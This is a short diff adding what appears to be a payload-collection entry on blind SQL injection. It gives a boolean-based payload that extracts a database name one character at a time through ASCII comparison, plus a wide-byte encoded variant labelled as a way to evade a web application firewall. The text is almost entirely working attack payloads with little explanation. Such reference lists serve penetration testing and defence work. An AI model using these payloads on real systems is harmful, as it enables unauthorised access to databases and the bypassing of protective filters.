@@ -1,0 +1,6 @@
+Incrementally testing ASCII values allows attackers to extract the database name:
+1' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) > 100--
+
+Same payload but wide byte injection is used(for WAF evasion):
+
+1%bf%27 AND ASCII(SUBSTRING((SELECT database()), 1, 1)) > 100--
